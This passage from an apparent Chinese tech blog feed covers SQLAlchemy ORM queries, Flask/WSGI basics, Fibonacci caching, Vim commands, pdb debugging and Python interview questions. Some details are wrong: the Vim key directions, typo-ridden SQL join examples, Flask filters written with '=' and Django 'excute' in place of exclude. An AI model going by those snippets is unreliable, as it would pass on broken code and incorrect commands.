password='abcdef')&gt;, &lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; print(str(session.query(User).filter(User.name != 'wu wu')))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE users.name != %s like/ilike 1234567# like（在有的后端不区分大小写，有的区分大小写，如果要不区分大小写，最好用ilike）&gt;&gt;&gt; session.query(User).filter(User.name.like('%wu%')).all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; print(str(session.query(User).filter(User.name.like('%wu%'))))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE users.name LIKE %s in/not in 12345678910111213141516# in&gt;&gt;&gt; session.query(User).filter(User.name.in_(['wu wu','hu'])).all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;, &lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; print(str(session.query(User).filter(User.name.in_(['wu wu','hu']))))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE users.name IN (%s, %s)# not in&gt;&gt;&gt; session.query(User).filter(~User.name.in_(['wu wu','hu'])).all()[&lt;User(name='qi', fullname='qi xxx xxxx', password='abcdef')&gt;, &lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; print(str(session.query(User).filter(~User.name.in_(['wu wu','hu']))))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE users.name NOT IN (%s, %s)&gt;&gt;&gt; is null/is not null 12345678910111213141516171819# is null&gt;&gt;&gt; session.query(User).filter(User.name == None).all()[&lt;User(name='None', fullname='None', password='None')&gt;]&gt;&gt;&gt; print(str(session.query(User).filter(User.name == None)))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE users.name IS NULL&gt;&gt;&gt; session.query(User).filter(User.name.is_(None)).all()[&lt;User(name='None', fullname='None', password='None')&gt;]# is not null&gt;&gt;&gt; session.query(User).filter(User.name != None).all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;, &lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;, &lt;User(name='qi', fullname='qi xxx xxxx', password='abcdef')&gt;, &lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; session.query(User).filter(User.name.isnot(None)).all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;, &lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;, &lt;User(name='qi', fullname='qi xxx xxxx', password='abcdef')&gt;, &lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; print(str(session.query(User).filter(User.name.isnot(None))))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE users.name IS NOT NULL and/or 123456789101112# and&gt;&gt;&gt; from sqlalchemy import and_&gt;&gt;&gt; session.query(User).filter(User.name == 'wu wu',User.fullname == 'wu xxx xxxx').all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; session.query(User).filter(and_(User.name == 'wu wu',User.fullname == 'wu xxx xxxx')).all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; session.query(User).filter(User.name == 'wu wu').filter(User.fullname == 'wu xxx xxxx').all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;]# or&gt;&gt;&gt; session.query(User).filter(or_(User.name == 'wu wu', User.name == 'hu')).all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;, &lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;] match/contains 1234567# 有的后端数据库可能不支持&gt;&gt;&gt; session.query(User).filter(User.name.contains(&apos;u w&apos;)).all()[&lt;User(name=&apos;wu wu&apos;, fullname=&apos;wu xxx xxxx&apos;, password=&apos;abcdef&apos;)&gt;]&gt;&gt;&gt; print(str(session.query(User).filter(User.name.contains(&apos;u w&apos;))))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE (users.name LIKE concat(concat(&apos;%%&apos;, %s), &apos;%%&apos;)) 使用文本SQLQuery通过指定它们与text()结合，可以灵活地使用文字字符串 ，这可以被大多数适用的方法所接受。例如， filter()和 order_by() 12345678&gt;&gt;&gt; for user in session.query(User).filter(text("id&lt;5")).order_by(text("id")).all(): print(user.name) wu wuhuqihg 绑定参数可以使用冒号在基于字符串的SQL中指定。要指定值，可以使用params()方法：12345678&gt;&gt;&gt; session.query(User).filter(text("id&lt;:value and name=:name")). \ params(value=2, name='wu wu').order_by(User.id).first()&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; print(str(session.query(User).filter(text("id&lt;:value and name=:name")). \ params(value=2, name='wu wu').order_by(User.id)))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE id&lt;%s and name=%s ORDER BY users.id 名称上的列匹配适用于简单情况，但在处理包含重复列名称的复杂语句时或在使用不易与特定名称匹配的匿名化ORM结构时会变得很难处理。另外，在处理结果行时，我们可能会发现映射列中存在打字行为。对于这些情况，该text()构造允许我们将其文本SQL位置链接到Core或ORM映射列表达式; 可以通过将列表达式作为位置参数传递给TextClause.columns()方法来实现此目的:1234567&gt;&gt;&gt; stmt = text("SELECT name, id, fullname, password FROM users where name=:name")&gt;&gt;&gt; stmt = stmt.columns(User.name, User.id, User.fullname, User.password)&gt;&gt;&gt; session.query(User).from_statement(stmt).params(name='wu wu').all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; print(str(session.query(User).from_statement(stmt).params(name='wu wu')))SELECT name, id, fullname, password FROM users where name=%s&gt;&gt;&gt; 计数Query有一个便利的计数方法count()：12&gt;&gt;&gt; session.query(User).filter(User.name.like('%wu')).count()1 对于需要特别指出“要计数的东西”的情况，我们可以直接使用表达式指定“计数”函数func.count()，可从func构造中获得:123456&gt;&gt;&gt; from sqlalchemy import func&gt;&gt;&gt; session.query(func.count(User.name), User.name).group_by(User.name).all()[(0, None), (1, 'hg'), (1, 'hu'), (1, 'qi'), (1, 'wu wu')]&gt;&gt;&gt; print(str(session.query(func.count(User.name), User.name).group_by(User.name)))SELECT count(users.name) AS count_1, users.name AS users_name FROM users GROUP BY users.name SELECT count(*) FROM table写法:12345&gt;&gt;&gt; session.query(func.count('*')).select_from(User).scalar()5&gt;&gt;&gt; print(str(session.query(func.count('*')).select_from(User)))SELECT count(%s) AS count_1 FROM users 相关对象12345678910111213&gt;&gt;&gt; user&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; address1 = Address(email_address='1111111111@xx.com',user=user)&gt;&gt;&gt; address2 = Address(email_address='2222222222@xx.com',user=user)&gt;&gt;&gt; session.add_all([address1,address2])&gt;&gt;&gt; session.commit()&gt;&gt;&gt; user.addresses[&lt;Address(email_address='1111111111@xx.com')&gt;, &lt;Address(email_address='2222222222@xx.com')&gt;]&gt;&gt;&gt; address1.user&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; address2.user&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; 在User上执行查询时并不会将addresses也查询出来123456&gt;&gt;&gt; session.query(User).all()[&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;, &lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;, &lt;User(name='qi', fullname='qi xxx xxxx', password='abcdef')&gt;, &lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;, &lt;User(name='None', fullname='None', password='None')&gt;]&gt;&gt;&gt; print(session.query(User))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users&gt;&gt;&gt; 只有当查询user.addresses集合时才会加载，因为使用的是惰性加载 连接查询User和之间的简单隐式连接Address，我们可以使用Query.filter()它们将相关的列等同起来： 123456789&gt;&gt;&gt; for u, a in session.query(User, Address).\ filter(User.id==Address.user_id).\ all(): print(u,a) &lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt; &lt;Address(email_address='1111111111@xx.com')&gt;&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt; &lt;Address(email_address='2222222222@xx.com')&gt;&gt;&gt;&gt; 使用Query.join()也可以实现上面的查询：1234567&gt;&gt;&gt; for u, a in session.query(User,Address).join(Address).all(): print(u,a) &lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt; &lt;Address(email_address='1111111111@xx.com')&gt;&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt; &lt;Address(email_address='2222222222@xx.com')&gt;&gt;&gt;&gt; Query.join()知道如何连接User ，Address因为它们之间只有一个外键。如果没有外键或多个外键，Query.join()则在使用下列其中一种形式时效果更好：1234query.join(Address, User.id==Address.user_id) # explicit conditionquery.join(User.addresses) # specify relationship from left to rightquery.join(Address, User.addresses) # same, with explicit targetquery.join('addresses') # same, using a string Query如果有多个实体，选择什么？Query.join()方法通常会从实体列表中最左边的项加入，省略ON子句或ON子句是普通SQL表达式时。要控制JOIN列表中的第一个实体，使用Query.select_from()方法：1query = session.query(User, Address).select_from(Address).join(User) 子查询123456789101112131415161718192021&gt;&gt;&gt; from sqlalchemy.sql import func&gt;&gt;&gt; stmt = session.query(Address.user_id, func.count('*').\ label('address_count')).\ group_by(Address.user_id).subquery()&gt;&gt;&gt; &gt;&gt;&gt; for u, count in session.query(User, stmt.c.address_count).\ outerjoin(stmt, User.id==stmt.c.user_id).order_by(User.id): print(u, count) &lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt; None&lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt; None&lt;User(name='qi', fullname='qi xxx xxxx', password='abcdef')&gt; None&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt; 2&lt;User(name='None', fullname='None', password='None')&gt; None&gt;&gt;&gt; print(str(session.query(User, stmt.c.address_count).\ outerjoin(stmt, User.id==stmt.c.user_id).order_by(User.id)))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password, anon_1.address_count AS anon_1_address_count FROM users LEFT OUTER JOIN (SELECT addresses.user_id AS user_id, count(%s) AS address_count FROM addresses GROUP BY addresses.user_id) AS anon_1 ON users.id = anon_1.user_id ORDER BY users.id&gt;&gt;&gt; 如果希望子查询映射到实体？可以使用aliased() 将映射类的“别名”关联到子查询：123456789101112131415&gt;&gt;&gt; stmt = session.query(Address).\ filter(Address.email_address != 'j25@yahoo.com').\ subquery()&gt;&gt;&gt; &gt;&gt;&gt; adalias = aliased(Address, stmt)&gt;&gt;&gt; for user, address in session.query(User, adalias).\ join(adalias, User.addresses): print(user) print(address) &lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;&lt;Address(email_address='1111111111@xx.com')&gt;&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;&lt;Address(email_address='2222222222@xx.com')&gt; 常见关系运算符 __eq__()（多对一“等于”比较）： query.filter(Address.user == someuser) __ne__()（多对一“不等于”比较）： query.filter(Address.user != someuser) IS NULL（多对一比较，也可使用__eq__()) query.filter(Address.user == None) contains()（用于一对多集合）： query.filter(User.addresses.contains(someaddress)) any()（用于集合）： 1234query.filter(User.addresses.any(Address.email_address == &apos;bar&apos;))# also takes keyword arguments:query.filter(User.addresses.any(email_address=&apos;bar&apos;)) has()（用于标量参考）： query.filter(Address.user.has(name=&#39;ed&#39;)) Query.with_parent()（用于任何关系）： session.query(Address).with_parent(someuser, &#39;addresses&#39;) 急切加载如果没有指定关系加载的方式，默认是延迟加载，例如上面的User.addresses,如果要在查询时加载关系，需要使用Query.options()指定加载的方式 子查询加载1234567891011121314151617181920212223&gt;&gt;&gt; from sqlalchemy.orm import subqueryload&gt;&gt;&gt; hg = session.query(User).\ options(subqueryload(User.addresses)).\ filter_by(name='hg').one()SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_passwordFROM usersWHERE users.name = ?SELECT addresses.id AS addresses_id, addresses.email_address AS addresses_email_address, addresses.user_id AS addresses_user_id, anon_1.users_id AS anon_1_users_idFROM (SELECT users.id AS users_id FROM users WHERE users.name = ?) AS anon_1JOIN addresses ON anon_1.users_id = addresses.user_idORDER BY anon_1.users_id, addresses.id&gt;&gt;&gt; hg&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; hg.addresses[&lt;Address(email_address='1111111111@xx.com')&gt;, &lt;Address(email_address='2222222222@xx.com')&gt;] 加入载入123456789101112131415&gt;&gt;&gt; from sqlalchemy.orm import joinedload&gt;&gt;&gt; hg = session.query(User). \ options(joinedload(User.addresses)).\ filter(User.name == 'hg').one()&gt;&gt;&gt; &gt;&gt;&gt; hg&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; hg.addresses[&lt;Address(email_address='1111111111@xx.com')&gt;, &lt;Address(email_address='2222222222@xx.com')&gt;]&gt;&gt;&gt; print(str(session.query(User). \ options(joinedload(User.addresses)).\ filter(User.name == 'hg')))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password, addresses_1.id AS addresses_1_id, addresses_1.email_address AS addresses_1_email_address, addresses_1.user_id AS addresses_1_user_id FROM users LEFT OUTER JOIN addresses AS addresses_1 ON users.id = addresses_1.user_id WHERE users.name = %s 参考http://docs.sqlalchemy.org/en/latest/orm/]]></content>
      <categories>
        <category>sqlalchemy</category>
      </categories>
      <tags>
        <tag>sqlalchemy -ORM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flask基本处理流程]]></title>
    <url>%2Fflask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B.html</url>
    <content type="text"><![CDATA[也许一个人在真正无可奈何的时候，除了微笑，也只好微笑了 搜集了一些资料,对flask处理流程有个宏观上的认识 WSGIWSGI，全称 Web Server Gateway Interface，或者 Python Web Server Gateway Interface ，是为 Python 语言定义的 Web 服务器和 Web 应用程序或框架之间的一种简单而通用的接口。它是一个Gateway，也就是网关。网关的作用就是在协议之间进行转换。 很多框架都自带了 WSGI server ，比如 Flask，webpy，Django等。但是性能不好，自带的 web server 更多的是测试用途，发布时则使用生产环境的 WSGI server或者是联合 nginx 做 uwsgi。 在网上看到一张图有助于理解: WSGI的使用方法实际上是包含在APP里面的，最右端的app实际上应该指的是逻辑功能，包括URL和view function的对应关系。 WSGI其实是作为一个接口，来接受Server传递过来的信息, 然后通过这个接口调用后台app里的view function进行响应。 flask基本处理流程处理关键步骤: 注: environ为http的相关信息，如请求头等, start_response是响应信息]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用缓存优化斐波那契]]></title>
    <url>%2F%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98%E4%BC%98%E5%8C%96%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91.html</url>
    <content type="text"><![CDATA[当你觉得很累的时候，说明你正在走上坡路。 网上看到某位大佬讲这个,自己也动手写写 cache优化通过缓存，如果计算过的值在缓存中，就不需要重复计算 123456789101112131415161718192021222324252627282930313233343536373839404142434445from functools import wrapsimport timedef cache(func): data = &#123;&#125; @wraps(func) # 消除装饰的副作用 def wrapper(n): if n not in data: result = func(n) data[n] = result return data[n] return wrapper@cachedef fib_use_cache(n): if n &lt;= 2: return 1 return fib_use_cache(n - 2) + fib_use_cache(n - 1)def fib_none_cache(n): if n &lt;= 2: return 1 return fib_none_cache(n - 2) + fib_none_cache(n - 1)def main(): # none cache print('none cache') start_time = time.time() for i in range(1, 30): print(fib_none_cache(i)) end_time = time.time() print('cost time:&#123;&#125;'.format(end_time - start_time)) print('-' * 30) # use cache print('use cache') start_time = time.time() for i in range(1, 30): print(fib_use_cache(i)) end_time = time.time() print('cost time:&#123;&#125;'.format(end_time - start_time))if __name__ == '__main__': main() 缓存有限，使用LRUcache优化使用双端链表加快添加和删除使用LRU算法，维护最近使用过的，移除最近未使用的 大致流程: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100from functools import wrapsimport timeclass Node(object): def __init__(self, prev=None, next=None, key=None, value=None): self.prev = prev self.next = next self.key = key self.value = value# 使用循环双端链表,做到O(1)的删除和添加class CircularDoubleLinkList(object): def __init__(self): self.root_node = Node() self.root_node.prev, self.root_node.next = self.root_node, self.root_node def head_node(self): return self.root_node.next def tail_node(self): return self.root_node.prev def append(self, node): tail_node = self.tail_node() tail_node.next = node node.prev = tail_node node.next = self.root_node self.root_node.prev = node def remove(self, node): if node is self.root_node: return node.prev.next = node.next node.next.prev = node.prevclass LRUCache(object): def __init__(self, max_size=16): self.max_size = max_size self.cache = &#123;&#125; self.access = CircularDoubleLinkList() def is_full(self): return len(self.cache) &gt;= self.max_size def __call__(self, func): @wraps(func) def wrapper(n): if n in self.cache: # 在缓存中 node = self.cache[n] self.access.remove(node) self.access.append(node) res = node.value else: # 不在缓存中 new_value = func(n) res = new_value new_node = Node(key=n, value=new_value) self.cache[n] = new_node if self.is_full(): # 缓存full rm_node = self.access.head_node() self.access.remove(rm_node) del self.cache[rm_node.key] self.access.append(new_node) return res return wrapper@LRUCache()def fib_use_lrucache(n): if n &lt;= 2: return 1 return fib_use_lrucache(n - 1) + fib_use_lrucache(n - 2)def fib_none_cache(n): if n &lt;= 2: return 1 return fib_none_cache(n - 1) + fib_none_cache(n - 2)def main(): # none cache print('none cache') start_time = time.time() for i in range(1, 30): print(fib_none_cache(i)) end_time = time.time() print('cost time:&#123;&#125;'.format(end_time - start_time)) print('-' * 30) # use lrucache print('use lrucache') start_time = time.time() for i in range(1, 30): print(fib_use_lrucache(i)) end_time = time.time() print('cost time:&#123;&#125;'.format(end_time - start_time))if __name__ == '__main__': main()]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>斐波那契数列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vim常用命令总结--经常翻看,就能熟练使用]]></title>
    <url>%2FVim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93--%E7%BB%8F%E5%B8%B8%E7%BF%BB%E7%9C%8B%2C%E5%B0%B1%E8%83%BD%E7%86%9F%E7%BB%83%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[今天很残酷,明天也一样,后天也许会不同 使用 Vim 的时间不长，Vim一开始学习的时候，面对很多的操作命令要去记住，常常望而却步，因此整理了些常用命令。相信只要坚持使用，经常翻看，使用起来也会得心应手。 光标移动 命令 作用 h,j,k,l 或者 上下左右键 h表示往左，j表示往下，k表示往右，l表示往上 ctrl+f 下一页 ctrl+b 上一页 o,O 开启新的一行 ^ 一行的开头 $ 一行的结尾 gg 文件的开头 [N]G 文件第N行(直接G到最后一行) 插入模式 命令 作用 i 插入到光标前面 I 插入到一行的开头 a 插入到光标后面 A 插入到一行的最后 Esc 退出插入模式 编辑 命令 作用 u 撤销上一步操作 ctrl+r 恢复上一步操作 . 重复最后一个命令 ~ 变为大写 [N]&gt;&gt; 一行或N行右移一个tab键 [N]&lt;&lt; 一行或N行左移一个tab键 关闭 命令 作用 w 保存 wq 保存并关闭 q 关闭(已保存) q! 强制关闭，丢弃缓存区内容 搜索 命令 作用 /pattern 按照pattern搜索 ?pattren 向后搜索 n 光标到达搜索结果的前一个目标 N 光标到达搜索结果的后一个目标 视觉模式 命令 作用 v 选中一个或者多个字符(配合方向键使用) V 选中一行 剪切和复制 命令 作用 dd 删除一行 D 删除当前光标到一行的最后 x 删除后一个字符 X 删除前一个字符 [N]yy 复制一行或者N行 p 粘贴 窗口操作 命令 作用 :split 水平分割出一个窗口 :vsplit 垂直分割出一个窗口 close 关闭窗口 ctrl+w 切换窗口]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3调试(debug)--pdb]]></title>
    <url>%2Fpython3%E8%B0%83%E8%AF%95(debug)--pdb.html</url>
    <content type="text"><![CDATA[得之坦然，失之淡然，顺其自然，争其必然 pdb调试pdb命令清单 忘记了方便查询 两种使用调试器的方法可以这样启动调试： python -m pdb filename.py import pdb;pdb.set_trace() 下面的演示中使用的是第一种，实际中大多数会选择后者 示例一12345678910def fib(n): if n &lt;= 2: return 1 return fib(n - 1) + fib(n - 2)def main(): print(fib(10))if __name__ == '__main__': main() 在断点上设置命令123456(Pdb) b line(需要下断点的行)(Pdb) commands num(第几个端点)(com) bt(com) args(com) end(Pdb) 以上几个命令是断点处分别显示回溯栈，参数。bt表示back trace，args表示函数的参数 以下为我自己设置的几个断点:效果: 也可以不用在命令处设置断点，使用如下方式也可以:直接使用args会显示当前层的参数，bt会显示栈回溯 u(up)与d(down)在递归时可以使用u(up),d(down)来回到上一层或下一层栈，如下: 从这个例子学到什么?从这个例子我们可以学到: 端点可以处可以设置命令 args可以显示传递给方法的参数 bt可以显示栈回溯 c表示继续直达断点 u和d可以回到上一层或者下一层栈 示例二123456789101112def pointless_loop(n): number_sum = 0 # 这是一个无意义的循环 for i in range(1, n + 1): number_sum += 1def main(): pointless_loop(30)if __name__ == '__main__': main() n(next)和s(step)的区别可以看出n表示执行下一行代码，但是不会进入函数，而s会执行并进入函数 为断点设置条件如下图是我设置的断点条件 为断点设置暂时条件（就是说断点在使用一次之后就会被删除）如下图: 禁用断点如下图: 使用display显示旧值与当前值如下图： 从这个示例中学到什么? next和step可以一步一步执行代码（注意next与step的区别） 断点可以有条件 可以禁用断点 使用display显示当前值与旧值 参考链接 一个很好的讲解pdb调试视频]]></content>
      <categories>
        <category>debug</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python面试题收集]]></title>
    <url>%2Fpython%E9%9D%A2%E8%AF%95%E9%A2%98%E6%94%B6%E9%9B%86.html</url>
    <content type="text"><![CDATA[学习别人的，渐渐成为自己的 搜集一些别人的面试题,为自己的面试做些准备。以后逐渐添加面试题 nginx与uwsgi是如何通信的？我们知道，nginx把浏览器等发过来的请求通过proxy_pass或者uwsgi_pass转发给上游的web application进行处理，然后把处理的结果发送给浏览器。uwsgi_pass命令的处理函数为ngx_http_uwsgi_handler,也就是说，当有请求到达配置uwsgi_pass的location时，会调用ngx_http_uwsgi_handler方法，而该方法是整个uwsgi事件处理的入口方法。下面来看该方法： 123456789101112static ngx_int_t ngx_http_uwsgi_handler(ngx_http_request_t *r) &#123; ngx_http_upstream_t *u; ngx_http_uwsgi_loc_conf_t *uwcf; uwcf = ngx_http_get_module_loc_conf(r, ngx_http_uwsgi_module); u = r-&gt;upstream; …… u-&gt;create_request = ngx_http_uwsgi_create_request;//根据wsgi协议创建请求包体 u-&gt;process_header = ngx_http_uwsgi_process_status_line;//根据wsgi协议解析uwsgi发送来的头部 …… rc = ngx_http_read_client_request_body(r, ngx_http_upstream_init);//从浏览器读取body数据 …… &#125; nginx与uwsgi是多线程还是多进程 ? uwsgi是用c语言写的一个webserver，可以启动多个进程，进程里面可以启动多个线程来服务。进程分为主进程和worker进程，worker里面可以有多个线程。 Nginx会按需同时运行多个进程：一个主进程(master)和几个工作进程(worker)，配置了缓存时还会有缓存加载器进程(cache loader)和缓存管理器进程(cache manager)等。Nginx主要通过“共享内存”的机制实现进程间通信。主进程以root用户身份运行，而worker、cache loader和cache manager均应以非特权用户身份运行。 在工作方式上，Nginx分为单工作进程和多工作进程两种模式。在单工作进程模式下，除主进程外，还有一个工作进程，工作进程是单线程的；在多工作进程模式下，每个工作进程包含多个线程。Nginx默认为单工作进程模式。 连表查询假设有如下两张表： 表A ID Name 1 Tiim 2 Jimmy 3 John 4 Tom 表B ID Hobby 1 Football 2 Basketball 2 Tennis 4 Soccer 内联结1Select A.Name B.Hobby from A, B where A.id = B.id 这是隐式的内联结，查询的结果是： Name Hobby Tiim Football Jimmy Basketball Jimmy Tennis Tom Soccer 它的作用和：1select A.Name,B.Hobby from A INNER join B on A.id = B.id 外左联结1select A.Name,B.Hobby from A left join B on A.id = B.id 这样查询得到的结果将会是保留所有A表中联结字段的记录，若无与其相对应的B表中的字段记录则留空，结果如下： Name Hobby Tiim Football Jimmy Basketball,Tennis Jhon Tom Soccer 所以从上面结果看出，因为A表中的John记录的ID没有在B表中有对应ID，因此为空，但Name栏仍有John记录。 右外联结1select A.Name.N.Hobby from A right join B on A/id = B.id 结果将会是： Name Hobby Tiim Football Jimmy Basketball Jimmy Tennis Tom Soccer ORM中的连表查询Django中1Entry.objects.filter(blog__name='Beatles Blog') Flask中1Entry.query.join(Blog,Blog.id == Entry.blog_id).filter(Blog.name = 'Beatles Blog') 写一个单例模式 使用继承方式: 123456789101112class Singleton: _instance = None def __new__(cls, *args, **kwargs): if cls._instance is None: cls._instance = super(Singleton, cls).__new__(cls, *args, **kwargs) return cls._instanceclass SingleSpam(Singleton): TEST = 'testing's1 = SingleSpam()print(s1.TEST, ' ', id(s1))s2 = SingleSpam()print(s2.TEST, ' ', id(s2)) 使用装饰器 12345678910111213141516from functools import wrapsdef singleton(cls): instances = &#123;&#125; @wraps(cls) def _instance(*args, **kwargs): if cls not in instances: instances[cls] = cls(*args, **kwargs) return instances[cls] return _instance@singletonclass SingleSpam(object): TEST = 'testing's1 = SingleSpam()print(s1.TEST, ' ', id(s1))s2 = SingleSpam()print(s2.TEST, ' ', id(s2)) 使用元类 123456789101112class Singleton(type): _instance = None def __call__(cls, *args, **kwargs): if cls._instance is None: cls._instance = super(Singleton, cls).__call__(*args, **kwargs) return cls._instanceclass SingleSpam(metaclass=Singleton): TEST = 'testing's1 = SingleSpam()print(s1.TEST, ' ', id(s1))s2 = SingleSpam()print(s2.TEST, ' ', id(s2)) 请你说出几种常见的反爬策略? 检查user-agent 加防盗链 使用验证码 监控ip 监控session 将请求的参数加密 请说一下线程与进程的区别进程和线程的主要差别在于它们是不同的操作系统资源管理方式。进程有独立的地址空间，一个进程崩溃后，在保护模式下不会对其它进程产生影响，而线程只是一个进程中的不同执行路径。线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间，一个线程死掉就等于整个进程死掉，所以多进程的程序要比多线程的程序健壮，但在进程切换时，耗费资源较大，效率要差一些。但对于一些要求同时进行并且又要共享某些变量的并发操作，只能用线程，不能用进程。 1) 简而言之,一个程序至少有一个进程,一个进程至少有一个线程. 线程的划分尺度小于进程，使得多线程程序的并发性高。另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。下面的程序 会是什么情况？答案会报参数错误。123456789class A(object): def run(self,a): return aclass B(A): def run(self,a,b): return bB().run(1) 因为B重写了run方法，所以run应该有两个参数 ORM常用筛选条件Django大于、大于等于12345__gt 大于__gte 大于等于User.objects.filter(age__gt=10) // 查询年龄大于10岁的用户User.objects.filter(age__gte=10) // 查询年龄大于等于10岁的用户 小于、小于等于12345__lt 小于__lte 小于等于User.objects.filter(age__lt=10) // 查询年龄小于10岁的用户User.objects.filter(age__lte=10) // 查询年龄小于等于10岁的用户 in123__in查询年龄在某一范围的用户User.objects.filter(age__in=[10, 20, 30]) like1234__exact 精确等于 like 'aaa'__iexact 精确等于 忽略大小写 ilike 'aaa'__contains 包含 like '%aaa%'__icontains 包含 忽略大小写 ilike '%aaa%'，但是对于sqlite来说，contains的作用效果等同于icontains。 is null / is not null1234__isnull 判空User.objects.filter(username__isnull=True) // 查询用户名为空的用户User.objects.filter(username__isnull=False) // 查询用户名不为空的用户 不等于/不包含于12User.objects.filter().excute(age=10) // 查询年龄不为10的用户User.objects.filter().excute(age__in=[10, 20]) // 查询年龄不为在 [10, 20] 的用户 Flask大于、大于等于123User.query.filter(User.age &gt; 10) // 查询年龄大于10岁的用户User.query.filter(User.age &gt;= 10) // 查询年龄大于等于10岁的用户 小于、小于等于123User.query.filter(User.age &lt; 10) // 查询年龄小于10岁的用户User.query.filter(User.age &lt;= 10) // 查询年龄小于等于10岁的用户 in12查询年龄在某一范围的用户User.query.filter(User.age.in_([10, 20, 30])) like1User.query.filter(User.name.like('%wu%')) is null / is not null123User.query.filter(User.username = None ) // 查询用户名为空的用户User.query.filter(User.username != None ) // 查询用户名不为空的用户 不等于/不包含于12User.query.filter(~(User.age=10)) // 查询年龄不为10的用户User.objects.filter(~(User.age.in_([10,20]))) // 查询年龄不为在 [10, 20] 的用户 put与post的区别?POST用于提交请求，可以更新或者创建资源，是非幂等的举个例子，在我们的支付系统中，一个api的功能是创建收款金额二维码，它和金额相关，每个用户可以有多个二维码，如果连续调用则会创建新的二维码，这个时候就用POST 